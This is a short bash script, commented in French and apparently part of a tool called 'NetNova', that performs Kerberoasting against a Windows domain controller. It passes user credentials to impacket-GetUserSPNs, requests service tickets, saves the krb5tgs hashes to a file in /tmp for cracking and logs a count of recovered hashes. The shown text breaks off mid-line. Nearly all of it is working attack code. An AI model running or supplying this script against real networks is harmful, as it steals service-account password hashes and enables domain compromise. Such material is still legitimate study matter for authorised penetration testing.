#!/bin/bash
TARGET=$1
DOMAIN=$2
USER=$3
PASSWORD=$4
LOG_FILE="/tmp/netnova_kerberoasting.log"

mkdir -p /tmp/netnova_attack

echo "[$(date '+%Y-%m-%d %H:%M:%S')] Kerberoasting lancé sur $TARGET ($DOMAIN)" > $LOG_FILE
echo "[$(date '+%Y-%m-%d %H:%M:%S')] Recherche des comptes de service SPN..." >> $LOG_FILE

# Vrai Kerberoasting avec impacket
impacket-GetUserSPNs "$DOMAIN/$USER:$PASSWORD" \
    -dc-ip "$TARGET" \
    -request \
    -outputfile /tmp/netnova_attack/krb_hashes.txt 2>&1 | tee -a $LOG_FILE

if [ -f /tmp/netnova_attack/krb_hashes.txt ]; then
    COUNT=$(grep -c "krb5tgs" /tmp/netnova_attack/krb_hashes.txt 2>/dev/null || echo 0)
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $COUNT hash(es) TGS récupéré(s) — cible :